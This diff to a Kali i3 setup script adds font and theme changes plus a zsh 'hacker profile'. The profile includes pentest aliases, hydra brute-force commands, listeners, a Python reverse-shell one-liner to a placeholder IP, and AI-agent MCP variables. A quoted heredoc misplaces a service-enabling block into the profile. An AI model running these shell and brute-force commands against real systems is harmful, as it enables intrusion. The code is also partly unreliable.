@@ -51,6 +51,7 @@ init_step_labels() {
         ["step_setup_tmux_neon"]="$(msg STEP_SETUP_TMUX_NEON)"
         ["step_install_zsh_omz"]="$(msg STEP_INSTALL_ZSH_OMZ)"
         ["step_deploy_zshrc"]="$(msg STEP_DEPLOY_ZSHRC)"
+        ["step_deploy_hacker_profile"]="$(msg STEP_DEPLOY_HACKER_PROFILE)"
         ["step_setup_i3_desktop_entry"]="$(msg STEP_SETUP_I3_DESKTOP_ENTRY)"
         ["step_install_security_suite"]="$(msg STEP_INSTALL_SECURITY_SUITE)"
         ["step_install_advanced_tools"]="$(msg STEP_INSTALL_ADVANCED_TOOLS)"
@@ -112,6 +113,9 @@ step_deploy_dotfiles() {
     local cfg_dir="${TARGET_HOME}/.config"
     run_as_user "mkdir -p ${cfg_dir}/{i3,polybar,rofi,picom,kitty,zsh,gtk-3.0,gtk-4.0}"
 
+    # Install IosevkaTerm Nerd Font for all configs
+    install_iosevka_font
+
     # i3 config - NEON MINIMAL
     cat > "${cfg_dir}/i3/config" <<I3CONF
 # i3-wm Config - NEON MINIMAL Theme
@@ -132,6 +136,9 @@ client.focused    \$neon-cyan \$neon-cyan \$bg \$neon-cyan \$neon-cyan
 client.unfocused  \$bg-alt   \$bg-alt    \$fg \$bg-alt   \$bg-alt
 client.urgent     \$urgent   \$urgent    \$fg \$urgent   \$urgent
 client.background \$bg
+
+# Font
+font pango:IosevkaTerm NF 10
 
 # Window rules
 for_window [window_role="pop-up"] floating enable
@@ -207,7 +214,7 @@ I3CONF
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/i3/config"
     ok "Created: i3/config (NEON MINIMAL)"
 
-    # Polybar config - NEON MINIMAL with Fira Code
+    # Polybar config - NEON MINIMAL with IosevkaTerm NF (SketchyBar-style islands)
     cat > "${cfg_dir}/polybar/config.ini" <<POLYCONF
 [colors]
 background = ${NEON_BG}
@@ -218,29 +225,28 @@ alert = #7B2CBF
 
 [bar/main]
 width = 100%
-height = 28
-radius = 0
-
-padding-right = 4
-module-margin-right = 2
-font-0 = "FiraCode Nerd Font:size=10"
+height = 32
+radius = 12
+padding-right = 8
+module-margin-right = 4
+font-0 = "IosevkaTerm NF:size=10"
 background = ${NEON_BG}
 foreground = ${NEON_FG}
 border-size = 0
-border-color = #00000000
+border-color = ${NEON_BORDER}
 modules-left = i3
 modules-center = date
-modules-right = space pulseaudio memory cpu network
+modules-right = pulseaudio memory cpu network
 
 [module/i3]
 type = internal/i3
 format = <label-state>
-label-focused = "%index%"
-label-focused-background = ${NEON_BG_ALT}
-label-focused-foreground = ${NEON_ACCENT}
+label-focused = "[ %index% ]"
+label-focused-background = ${NEON_ACCENT}
+label-focused-foreground = ${NEON_BG}
 label-focused-padding = 2
-label-unfocused = "%index%"
-label-unfocused-background = ${NEON_BG}
+label-unfocused = "[ %index% ]"
+label-unfocused-background = ${NEON_BG_ALT}
 label-unfocused-foreground = ${NEON_FG}
 label-unfocused-padding = 2
 
@@ -249,27 +255,27 @@ type = internal/date
 interval = 1
 date = %a %d %b
 time = %H:%M
-label = %date% %time%
+label = "[ %date% %time% ]"
 
 [module/pulseaudio]
 type = internal/pulseaudio
-format-volume = "VOL %percentage%%"
-format-muted = "MUTE"
+format-volume = "[ VOL %percentage%% ]"
+format-muted = "[ MUTE ]"
 
 [module/memory]
 type = internal/memory
-format = "MEM %percentage_used%%"
+format = "[ MEM %percentage_used%% ]"
 
 [module/cpu]
 type = internal/cpu
-format = "CPU %percentage%%"
+format = "[ CPU %percentage%% ]"
 
 [module/network]
 type = internal/network
 interface = eth0
 interval = 3
-format-connected = "NET %local_ip%"
-format-disconnected = "NET OFF"
+format-connected = "[ NET %local_ip% ]"
+format-disconnected = "[ NET OFF ]"
 
 [settings]
 screenchange-reload = true
@@ -278,44 +284,44 @@ POLYCONF
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/polybar/config.ini"
     ok "Created: polybar/config.ini (NEON MINIMAL)"
 
-    # Rofi config - NEON MINIMAL
+    # Rofi config - NEON MINIMAL with IosevkaTerm NF
     cat > "${cfg_dir}/rofi/config.rasi" <<ROFI
 configuration {
     show-icons: true;
     icon-theme: "Papirus-Dark";
-    font: "FiraCode Nerd Font 10";
+    font: "IosevkaTerm NF 10";
 }
 window {
     background-color: ${NEON_BG};
     border: 0px;
-    border-radius: 0px;
+    border-radius: 12px;
 }
 listview {
     background-color: ${NEON_BG};
     border-color: ${NEON_BG_ALT};
-    border-radius: 0px;
+    border-radius: 12px;
 }
 element {
     background-color: ${NEON_BG};
-    border-radius: 0px;
+    border-radius: 8px;
     element-text-color: ${NEON_FG};
 }
 element-selected {
     background-color: ${NEON_ACCENT};
-    border-radius: 0px;
+    border-radius: 8px;
     element-text-color: ${NEON_BG};
 }
 prompt {
     background-color: ${NEON_BG};
     border-color: #FF006E;
-    border-radius: 0px;
+    border-radius: 12px;
     text-color: ${NEON_ACCENT};
 }
 ROFI
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/rofi/config.rasi"
     ok "Created: rofi/config.rasi (NEON MINIMAL)"
 
-    # Picom config
+    # Picom config - NEON MINIMAL with rounded corners
     cat > "${cfg_dir}/picom.conf" <<PICOM
 backend = "glx";
 vsync = true;
@@ -326,13 +332,14 @@ shadow-radius = 12;
 shadow-color = ${NEON_ACCENT};
 fading = true;
 fade-delta = 4;
+corner-radius = 10;
 PICOM
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/picom.conf"
     ok "Created: picom.conf"
 
-    # Kitty config - NEON MINIMAL
+    # Kitty config - NEON MINIMAL with IosevkaTerm NF
     cat > "${cfg_dir}/kitty/kitty.conf" <<KITTY
-font_family FiraCode Nerd Font
+font_family IosevkaTerm NF
 font_size 11.0
 bold_font auto
 italic_font auto
@@ -371,16 +378,16 @@ KITTY
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/kitty/kitty.conf"
     ok "Created: kitty/kitty.conf (NEON MINIMAL)"
 
-    # Alacritty config - NEON MINIMAL
+    # Alacritty config - NEON MINIMAL (YAML for legacy, TOML for v0.13+)
     cat > "${cfg_dir}/alacritty/alacritty.yml" <<ALACRITTY
 font:
   normal:
-    family: FiraCode Nerd Font
+    family: IosevkaTerm NF
     style: Regular
   bold:
-    family: FiraCode Nerd Font
+    family: IosevkaTerm NF
   italic:
-    family: FiraCode Nerd Font
+    family: IosevkaTerm NF
   size: 11.0
 
 window:
@@ -422,15 +429,64 @@ colors:
     cyan:    "#7B2CBF"
     white:   "#FFFFFF"
 ALACRITTY
+
+    cat > "${cfg_dir}/alacritty/alacritty.toml" <<ALACRITTY_TOML
+[font]
+normal = { family = "IosevkaTerm NF", style = "Regular" }
+bold = { family = "IosevkaTerm NF", style = "Bold" }
+italic = { family = "IosevkaTerm NF", style = "Italic" }
+size = 11.0
+
+[window]
+opacity = 0.95
+padding = { x = 12, y = 12 }
+decorations = "None"
+
+[colors.primary]
+background = "${NEON_BG}"
+foreground = "${NEON_FG}"
+
+[colors.cursor]
+cursor = "${NEON_ACCENT}"
+text = "${NEON_BG}"
+
+[colors.vi_mode_cursor]
+cursor = "#FF006E"
+text = "${NEON_BG}"
+
+[colors.selection]
+text = "${NEON_BG}"
+background = "${NEON_ACCENT}"
+
+[colors.normal]
+black = "${NEON_BG}"
+red = "#FF006E"
+green = "${NEON_ACCENT}"
+yellow = "#7B2CBF"
+blue = "${NEON_ACCENT}"
+magenta = "#FF006E"
+cyan = "#7B2CBF"
+white = "${NEON_FG}"
+
+[colors.bright]
+black = "${NEON_BG_ALT}"
+red = "#FF006E"
+green = "${NEON_ACCENT}"
+yellow = "#7B2CBF"
+blue = "${NEON_ACCENT}"
+magenta = "#FF006E"
+cyan = "#7B2CBF"
+white = "#FFFFFF"
+ALACRITTY_TOML
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/alacritty/alacritty.yml"
     ok "Created: alacritty/alacritty.yml (NEON MINIMAL)"
 
-    # GTK settings - NEON MINIMAL
+    # GTK settings - NEON MINIMAL with IosevkaTerm NF
     cat > "${cfg_dir}/gtk-3.0/settings.ini" <<'GTKCONF'
 [Settings]
 gtk-theme-name = Arc-Dark
 gtk-icon-theme-name = Papirus-Dark
-gtk-font-name = FiraCode Nerd Font 10
+gtk-font-name = IosevkaTerm NF 10
 gtk-cursor-theme-name = Breeze
 GTKCONF
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/gtk-3.0/settings.ini"
@@ -439,7 +495,7 @@ GTKCONF
 [Settings]
 gtk-theme-name = Arc-Dark
 gtk-icon-theme-name = Papirus-Dark
-gtk-font-name = FiraCode Nerd Font 10
+gtk-font-name = IosevkaTerm NF 10
 GTK4
     chown "${TARGET_UID}:${TARGET_GID}" "${cfg_dir}/gtk-4.0/settings.ini"
 
@@ -645,10 +701,135 @@ alias msf="msfconsole -q"
 
 # Path
 export PATH="$HOME/.local/bin:$HOME/go/bin:$PATH"
+
+# Source hacker profile if exists
+[[ -f "${HOME}/.config/zsh/hacker_profile.zsh" ]] && source "${HOME}/.config/zsh/hacker_profile.zsh"
 ZSHRC
 
     chown "${TARGET_UID}:${TARGET_GID}" "${TARGET_HOME}/.zshrc"
     ok ".zshrc deployed"
+}
+
+step_deploy_hacker_profile() {
+    header "Deploy Hacker Profile (Security Tools & Agent Integration)"
+
+    local zsh_dir="${TARGET_HOME}/.config/zsh"
+    run_as_user "mkdir -p ${zsh_dir}"
+
+    cat > "${zsh_dir}/hacker_profile.zsh" <<'HACKERPROFILE'
+# =============================================================================
+# Hacker Profile — Security Tools Aliases & Agent Variables
+# Generated by setup_i3_kali.sh
+# =============================================================================
+
+# --- Network Recon & Scanning ---
+alias nmap-quick='nmap -T4 -F'
+alias nmap-full='nmap -T4 -A -v'
+alias nmap-vuln='nmap -T4 --script vuln'
+alias masscan-quick='masscan -p1-65535 --rate=1000'
+alias gobuster-dir='gobuster dir -u'
+alias ffuf-quick='ffuf -u'
+alias nuclei-scan='nuclei -t'
+
+# --- Web App Testing ---
+alias sqlmap-auto='sqlmap --batch --crawl=3'
+alias wpscan-enum='wpscan --enumerate'
+alias dirb-quick='dirb'
+alias nikto-scan='nikto -h'
+
+# --- Exploitation & Post-Exploitation ---
+alias msf='msfconsole -q'
+alias sliver='sliver-client'
+alias covenant='covenant'
+
+# --- Wireless ---
+alias airodump='airodump-ng'
+alias aireplay='aireplay-ng'
+alias aircrack='aircrack-ng'
+alias wifite-auto='wifite --all --kill'
+
+# --- Password Attacks ---
+alias john-fast='john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt'
+alias hashcat-quick='hashcat -m 0 -a 0'
+alias hydra-ssh='hydra -L users.txt -P pass.txt ssh://'
+alias hydra-rdp='hydra -L users.txt -P pass.txt rdp://'
+
+# --- Reverse Shells & Listeners ---
+alias rlwrap-nc='rlwrap nc -lvnp'
+alias socat-shell='socat file:`tty`,raw,echo=0 tcp-listen:4444'
+alias python-shell="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+
+# --- File Transfer ---
+alias serve-http='python3 -m http.server 8000'
+alias serve-https='python3 -m http.server 8443 --cgi'
+alias wget-get='wget -r -np -nH --cut-dirs=1 -R index.html'
+
+# --- Binary Analysis ---
+alias ghidra-headless='ghidra/ghidraRun'
+alias radare2='r2'
+alias gdb-peda='gdb -ex "source /opt/peda/peda.py"'
+alias checksec='checksec --file'
+
+# --- Docker/Container Security ---
+alias dive-image='dive'
+alias trivy-scan='trivy image'
+alias grype-scan='grype'
+
+# --- Cloud ---
+alias aws-enum='aws-cli-enum'
+alias azure-enum='azure-enum'
+
+# --- Gentile AI Agent Integration ---
+export GENTLE_AI_AGENT="kali-i3"
+export GENTLE_AI_WORKSPACE="${HOME}/.config/agent-state"
+export KALI_MCP_ENDPOINT="http://localhost:8888"
+export HEXSTRIKE_MCP_ENDPOINT="http://localhost:8888"
+
+# --- Agent State Functions ---
+gentle_status() {
+    if command -v gentle-ai >/dev/null 2>&1; then
+        gentle-ai --status
+    elif [[ -f "${HOME}/.config/agent-state/current.state" ]]; then
+        cat "${HOME}/.config/agent-state/current.state"
+    else
+        echo "idle"
+    fi
+}
+
+gentle_log() {
+    local msg="$1"
+    local state="${2:-working}"
+    echo "${state}" > "${HOME}/.config/agent-state/current.state"
+    echo "[$(date '+%H:%M:%S')] ${msg}" >> "${HOME}/.config/agent-state/agent.log"
+}
+
+# --- Quick Nmap Helpers ---
+nmap-top100() { nmap -T4 --top-ports 100 "$1"; }
+nmap-top1000() { nmap -T4 --top-ports 1000 "$1"; }
+nmap-udp() { nmap -sU -T4 --top-ports 100 "$1"; }
+
+# --- Quick Gobuster ---
+gobuster-common() { gobuster dir -u "$1" -w /usr/share/wordlists/dirb/common.txt; }
+gobuster-big() { gobuster dir -u "$1" -w /usr/share/wordlists/dirb/big.txt; }
+
+# --- Color helpers ---
+    export NEON_BG='#06080f'
+    export NEON_FG='#f3f6f9'
+    export NEON_ACCENT='#e0c15a'
+    export NEON_PINK='#FF006E'
+    export NEON_PURPLE='#7B2CBF'
+
+    # --- Enable MCP Server Service ---
+    if systemctl list-unit-files | grep -q 'kali-server-mcp.service'; then
+        run_as_root "systemctl enable --now kali-server-mcp.service" 2>/dev/null || true
+    elif systemctl list-unit-files | grep -q 'mcp-server.service'; then
+        run_as_root "systemctl enable --now mcp-server.service" 2>/dev/null || true
+    fi
+
+HACKERPROFILE
+
+    chown "${TARGET_UID}:${TARGET_GID}" "${zsh_dir}/hacker_profile.zsh"
+    ok "Hacker profile deployed to ${zsh_dir}/hacker_profile.zsh"
 }
 
 step_switch_display_manager() {
@@ -958,6 +1139,30 @@ AGENT_MCP
     ok "HexStrike AI MCP configs deployed"
 }
 
+install_iosevka_font() {
+    header "Install IosevkaTerm Nerd Font"
+
+    local font_dir="${TARGET_HOME}/.local/share/fonts"
+    local temp_dir="/tmp/iosevka-term-nerd-font"
+    local font_url="https://github.com/ryanoasis/nerd-fonts/releases/latest/download/IosevkaTerm.zip"
+
+    run_as_user "mkdir -p ${font_dir}"
+    run_as_user "rm -rf ${temp_dir} && mkdir -p ${temp_dir}"
+
+    info "Downloading IosevkaTerm Nerd Font..."
+    if run_as_user "cd ${temp_dir} && curl -fsSL -o IosevkaTerm.zip '${font_url}'"; then
+        run_as_user "cd ${temp_dir} && unzip -q IosevkaTerm.zip"
+        run_as_user "cp ${temp_dir}/*.ttf ${font_dir}/ 2>/dev/null || true"
+        run_as_user "cp ${temp_dir}/*.otf ${font_dir}/ 2>/dev/null || true"
+        run_as_user "fc-cache -f ${font_dir} 2>/dev/null || true"
+        run_as_user "rm -rf ${temp_dir}"
+        ok "IosevkaTerm Nerd Font installed to ${font_dir}"
+    else
+        warn "Failed to download IosevkaTerm Nerd Font, skipping"
+        run_as_user "rm -rf ${temp_dir}"
+    fi
+}
+
 step_post_install_cleanup() {
     header "Post-Install Cleanup (NEON)"
 
@@ -1083,6 +1288,7 @@ main() {
         "step_setup_tmux_neon"
         "step_install_zsh_omz"
         "step_deploy_zshrc"
+        "step_deploy_hacker_profile"
         "step_setup_i3_desktop_entry"
     )
 
@@ -1125,7 +1331,7 @@ main() {
     if [[ ${SKIP_SHELL} -eq 1 ]]; then
         local -a filtered=()
         for step in "${ALL_STEPS[@]}"; do
-            [[ "${step}" == "step_install_zsh_omz" || "${step}" == "step_deploy_zshrc" ]] && continue
+            [[ "${step}" == "step_install_zsh_omz" || "${step}" == "step_deploy_zshrc" || "${step}" == "step_deploy_hacker_profile" ]] && continue
             filtered+=("${step}")
         done
         ALL_STEPS=("${filtered[@]}")
